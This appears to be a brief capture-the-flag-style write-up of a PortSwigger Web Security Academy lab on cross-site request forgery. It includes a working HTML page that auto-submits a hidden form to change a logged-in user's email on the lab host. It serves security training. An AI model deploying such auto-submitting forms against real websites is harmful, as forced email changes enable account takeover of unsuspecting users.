## CSRF vulnerability with no defense 

Login with the credentials

![image1](/images/portswigger-csrf-vuln-no-defenses/portswigger-CSRF-vulnerability-with-no-defenses1.png)

And intercept the request

![image2](/images/portswigger-csrf-vuln-no-defenses/portswigger-CSRF-vulnerability-with-no-defenses2.png)

Now create an HTML template i did like this

```html
<html>
  <body>
    <form action="https://ac851fec1f235d3780c01e9600ff00d2.web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="testtest@test.test" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html> 
```

![image3](/images/portswigger-csrf-vuln-no-defenses/portswigger-CSRF-vulnerability-with-no-defenses3.png)

Now click store, and then view exploit, and the email is changed
